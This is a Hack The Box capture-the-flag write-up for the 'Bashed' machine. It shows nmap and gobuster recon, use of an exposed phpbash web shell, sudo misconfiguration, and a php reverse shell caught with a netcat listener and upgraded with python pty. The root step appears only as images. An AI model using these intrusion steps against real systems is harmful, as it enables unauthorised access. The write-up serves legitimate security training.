---
title: "HTB - Bashed"
classes: wide
tag:
- "Tomcat default credentials"
- "War deploy exploit"
- "Easy Box"
- "TJ_Null's OSCP Prep"
header:
  teaser: /assets/images/htb/htb.png
ribbon: lawngreen
description: "Writeup for HTB - Bashed"
categories:
  - HTB
---

The given box ```Bashed``` is a Linux machine 

- [HackTheBox- Bashed](#hackthebox---Bashed)
- [Recon](#recon)
	- [Nmap Scan](#nmap-scan)
- [Enumeration](#enumeration)
	- []
- [Shell](#Shell)
- [Shell as root](#Shell as root)

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/bashed/assets/images/Bashed.png" >
</center>

## Recon

### Nmap Scan

`nmap` found one open port on TCP scan.

```shell
┌[us-vip-1]─[10.10.16.2][0xM3M0RY㉿kali]─[~/htb/easy_bashed]
└╼[★]$ cat nmap/initial_scan.nmap
# Nmap 7.92 scan initiated Thu Sep 15 01:52:04 2022 as: nmap -Pn -sC -sV -oN nmap/initial_scan.nmap -v 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up (0.25s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 15 02:10:01 2022 -- 1 IP address (1 host up) scanned in 1077.51 seconds
```

## Enumeration

### Site

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/bashed/assets/images/1.png" >
</center>

There is a hyperlink `phpbash` which takes to the github page. 

### Directory Bruteforcing

```shell
┌[us-vip-1]─[10.10.16.2][0xM3M0RY㉿kali]─[~]
└╼[★]$ gobuster dir -u http://10.10.10.68/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/15 02:02:50 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
```

from directory bruteforcing got 2 directories `php` and `dev` in that found some interesting files to execute the commands.

	dev/phpbash.min.php	
	dev/phpbash.php	
	php/sendMail.php	

### Exploring phpbash.php

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/bashed/assets/images/2.png" >
</center>

`phpbash.php` file executes command from `www-data` user, but through enumeration got one more user `scriptmanager`

Once we are into `scriptmanager` user or if we execute anything from scriptmanager it gets execute without passwd.

```shell
www-data@bashed
:/var/www/html/dev# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```


## Shell as www-data

For persistence, upload a `php-reverse-shell` to the box to get shell back,

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/bashed/assets/images/3.png" >
</center>

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/bashed/assets/images/4.png" >
</center>

```shell
┌[us-vip-1]─[10.10.16.2][0xM3M0RY㉿kali]─[~/htb/easy_bashed]
└╼[★]$ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.68] 57004
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 09:13:35 up  1:36,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@bashed:/$ ls
ls
bin   etc         lib         media  proc  sbin     sys  var
boot  home        lib64       mnt    root  scripts  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv      usr
www-data@bashed:/$ cd /home
cd /home
www-data@bashed:/home$ ls
```

## Shell as root

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/bashed/assets/images/5.png" >
</center>

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/bashed/assets/images/6.png" >
</center>